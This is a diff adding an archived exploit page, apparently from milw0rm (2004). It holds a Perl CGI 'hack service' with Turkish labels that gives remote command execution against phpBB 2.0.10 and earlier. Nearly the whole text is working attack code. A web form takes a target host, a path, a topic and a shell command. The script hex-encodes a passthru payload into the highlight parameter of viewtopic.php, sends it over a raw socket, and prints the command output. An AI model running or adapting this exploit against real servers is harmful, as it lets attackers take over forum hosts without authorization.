@@ -1,0 +1,75 @@
+<html>
+<head>
+<title>phpBB <= 2.0.10 Remote Command Execution Exploit (cgi version)</title>
+<pre>
+#!/usr/bin/perl
+
+#wphpbb.cgi 
+#hack service:)
+#http://site/cgi-bin/wphpbb.cgi
+
+use CGI qw(:standard); 
+$CGI::HEADERS_ONCE = 1; 
+$CGI = new CGI; 
+
+$atak = $CGI-&gt;param(&quot;atak&quot;); 
+$serv = $CGI-&gt;param(&quot;serv&quot;);
+$dir = $CGI-&gt;param(&quot;dir&quot;); 
+$topic = $CGI-&gt;param(&quot;topic&quot;); 
+$cmd = $CGI-&gt;param(&quot;cmd&quot;); 
+
+print $CGI-&gt;header(-type=&gt;'text/html',-charset=&gt;'windows-1254'); 
+print qq~&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=Content-Type&quot; content=text/html; charset=ISO-8859-9&gt;&lt;title&gt;phpBB HACK&lt;/title&gt;&lt;/head&gt; 
+&lt;body bgcolor=black text=red&gt;phpBB atak webscript&lt;br&gt;
+&lt;font color=blue&gt;exploit:by RusH security team // www.rst.void.ru&lt;br&gt;
+exploit update:ZzagorR&lt;/font&gt;&lt;br&gt;
+&lt;table align=left&gt;&lt;tr&gt;
+&lt;form action=? method=post&gt;
+&lt;input type=hidden name=atak value=phpbb&gt;
+&lt;td&gt;Site: &lt;/td&gt;&lt;td&gt;&lt;input type=text name=serv value=$serv size=50&gt;&lt;br&gt;&lt;font color=blue&gt;example: www.site.com&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;Klasor: &lt;/td&gt;&lt;td&gt;&lt;input type=text name=dir value=$dir size=50&gt;&lt;br&gt;&lt;font color=blue&gt;example: /phpBB2/&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;TopicNo: &lt;/td&gt;&lt;td&gt;&lt;input type=text name=topic value=$topic size=10&gt;&lt;br&gt;&lt;font color=blue&gt;example: 1&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;Komut: &lt;/td&gt;&lt;td&gt;&lt;input type=text name=cmd value=$cmd size=100&gt;&lt;br&gt;&lt;font color=blue&gt;example: id&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td colspan=2 align=center&gt;&lt;input type=submit value=&quot;Test&quot;&gt;&lt;/td&gt;&lt;/tr&gt;~; 
+
+if($atak eq &quot;phpbb&quot;) { 
+
+
+
+$serv =~ s/(http:\/\/)//eg;
+print &quot;&lt;tr&gt;&lt;td valign=top colspan=2&gt;&lt;font color=white&gt; Sonuclar&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&quot;; 
+$cmd=~ s/(.*);$/$1/eg;
+$cmd=~ s/(.)/&quot;%&quot;.uc(sprintf(&quot;%2.2x&quot;,ord($1)))/eg;
+$topic=~ s/(.)/&quot;%&quot;.uc(sprintf(&quot;%2.2x&quot;,ord($1)))/eg;
+$path  = $dir;
+$path .= 'viewtopic.php?t=';
+$path .= $topic;
+$path .= '&amp;rush=%65%63%68%6F%20%5F%53%54%41%52%54%5F%3B%20';
+$path .= $cmd;
+$path .= '%3B%20%65%63%68%6F%20%5F%45%4E%44%5F';
+$path .= '&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5F%47%45%54%5F%56%41%52%53%5B%72%75%73%68%5D%29.%2527';
+use IO::Socket;
+$socket = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$serv&quot;, PeerPort =&gt; &quot;80&quot;) || die &quot;[-] CONNECT FAILED\r\n&quot;;
+print $socket &quot;GET $path HTTP/1.1\n&quot;;
+print $socket &quot;Host: $serv\n&quot;;
+print $socket &quot;Accept: */*\n&quot;;
+print $socket &quot;Connection: close\n\n&quot;;
+$on = 0;
+while ($answer = &lt;$socket&gt;)
+ {
+  if ($answer =~ /^_END_/) { print &quot;&lt;tr&gt;&lt;td colspan=2 valign=top&gt;&lt;font color=white&gt;Islem Sonu&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&quot;; exit(); }
+  if ($on == 1) { print &quot;&lt;tr&gt;&lt;td colspan=2 valign=top&gt;$answer&lt;/td&gt;&lt;/tr&gt;&quot;; }
+  if ($answer =~ /^_START_/) { $on = 1; }
+ }
+
+
+print &quot;[-] EXPLOIT BASARISIZ\r\n&quot;;
+print &quot;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n&quot;;
+}
+
+print &quot;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;&quot;;
+
+# milw0rm.com [2004-12-03]
+</pre>
+</html>
+
